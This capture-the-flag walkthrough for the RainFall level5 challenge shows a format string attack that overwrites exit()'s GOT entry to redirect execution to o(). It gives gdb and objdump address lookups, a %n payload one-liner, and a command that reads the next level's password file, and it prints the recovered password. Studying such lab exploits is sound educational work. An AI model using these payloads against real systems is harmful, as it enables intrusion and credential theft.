# Walkthrough

**Main** : 
The goal is to to manipulate `printf()` function to calling `o()` using a format string attack  inside `n()` instead of exit
To do it we have to replace the address of `exit` in the `n()`  with the address of `o()`, for calling it instead of exit.
  
**Format `n`**:  
>  This format tell `printf` to write the number of characters printed
>     to a specified address,  number of characters that are successfully
>     written so far to the stream or buffer. <br/> `%[number]$n` : This
>     format  corresponds to the position of the address on the stack.

## Step 1

### Get address of o()

    (gdb) print &o 
    $1 = (<text variable, no debug info> *) 0x80484a4 <o>

### Get address of n()

    (gdb) print &n
    $5 = (<text variable, no debug info> *) 0x80484c2 <n>
    (gdb) 

### Get address of exit()
```
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```
## Step 2 
### Identify  the positiona of argument is our input

```
level5@RainFall:~$ python -c 'print "aaaa" + " %x" * 5' | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520
```
*The buffer the located at the 4th postion on the stack*

## Step 3 

### Step 1 : Create payload

The address `08049838` it convert in little-endian format `'\x38\x98\x04\x08'`
```
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload
```

### Step 2 : Load payload
```
 cat /tmp/payload - | ./level5
```

### Step 3: Get password
```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

